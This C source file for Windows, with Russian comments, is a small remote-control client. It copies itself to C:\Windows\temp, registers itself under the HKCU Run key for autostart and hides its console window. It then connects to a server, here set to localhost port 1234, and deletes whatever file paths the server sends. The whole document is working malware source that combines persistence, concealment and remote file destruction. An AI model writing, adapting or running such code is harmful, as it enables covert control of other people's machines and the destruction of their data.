#define _CRT_SECURE_NO_WARNINGS      
#define _WINSOCK_DEPRECATED_NO_WARNINGS  // разрешает использовать устаревшие winsock-функции (inet_addr и пр.)
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>   // сокеты Windows
#include <dos.h>        
#include <winreg.h>     // работа с реестром Windows
#pragma comment(lib, "ws2_32.lib")  // подключаем библиотеку сокетов
#define Error -1
#define Port 1234       
#define IP "127.0.0.1"   

// Функция добавления программы в автозагрузку и копирования в системную папку
int Autorun() {
    DWORD Path = 0;                         // будет хранить длину пути к текущему exe
    TCHAR IpFilename[MAX_PATH] = { 0 };    // буфер для пути к себе
    HKEY hKey;                              // дескриптор ключа реестра

    // GetModuleFileName возвращает полный путь к исполняемому файлу процесса
    if ((Path = GetModuleFileName(NULL, IpFilename, MAX_PATH)) == 0){
        printf("Error getting the path\n");
        return EXIT_FAILURE;
    }
    // Копируем себя в C:\\Windows\\temp\\Client.exe 
    CopyFile(IpFilename, L"C:\\Windows\\temp\\Client.exe", 0);

    // Открываем ключ автозагрузки для текущего пользователя (HKCU)
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0, KEY_SET_VALUE, &hKey)!= ERROR_SUCCESS){
        printf("Error opening registry key\n");
        RegCloseKey(hKey);
        return EXIT_FAILURE;
    }

    if (RegSetValueEx(hKey, L"Client", 0, REG_SZ, (const BYTE)L"C:\\Windows\\temp\\Client.exe", Path * sizeof(*IpFilename)) != ERROR_SUCCESS) {
        printf("Error when creating a parameter or assigning a value to it\n");
        RegCloseKey(hKey);
        return EXIT_FAILURE;
    }
    RegCloseKey(hKey);
    return EXIT_SUCCESS;
}

int main() {
    // Пытаемся прописать себя в автозагрузку (если не получилось — программа завершится)
    if (Autorun() == EXIT_FAILURE) {
        return EXIT_FAILURE; 
    }
    // Скрываем окно консоли (но процесс всё равно виден в диспетчере задач)
    HWND HWnd = GetConsoleWindow();
    ShowWindow(HWnd, SW_HIDE);

    WSADATA Ws; 
    char FileName[100] = { 0 };
    char DeletionError[50] = { "Deletion error"};
    char Successful[50] = { "The deletion was successful" };

    // Инициализация Winsock (версия 2.2)
    if (WSAStartup(MAKEWORD(2, 2), &Ws)) {
        printf("Error WinSock version initializaion");
        return EXIT_FAILURE;
    }
    // Создание TCP-сокета
    SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (Socket == INVALID_SOCKET) {
        printf("Error initialization socket");
        closesocket(Socket);
        return EXIT_FAILURE;
    }
    // Настройка адреса сервера (локальный хост, порт 1234)
    SOCKADDR_IN SockAddr; 
    memset(&SockAddr, 0, sizeof(SockAddr));
    SockAddr.sin_family = AF_INET;
    SockAddr.sin_port = htons(Port);
    SockAddr.sin_addr.S_un.S_addr = inet_addr(IP);

    // Бесконечная попытка подключения (блокирует выполнение)
    while (connect(Socket, (struct sockaddr*)&SockAddr, sizeof(SockAddr)) == SOCKET_ERROR);

    // Основной цикл: получаем имя файла - удаляем - отправляем результат
    while (1) { 
        recv(Socket, FileName, sizeof(FileName), 0);   // ждём путь от сервера
        if (strcmp(FileName, "Exit") == 0) break;      // команда выхода
        // remove возвращает 0 при успехе, иначе !=0
        if (remove(FileName)) send(Socket, DeletionError, sizeof(DeletionError), 0);
        else send(Socket, Successful, sizeof(Successful), 0);
    }
    closesocket(Socket);
    return EXIT_SUCCESS;
}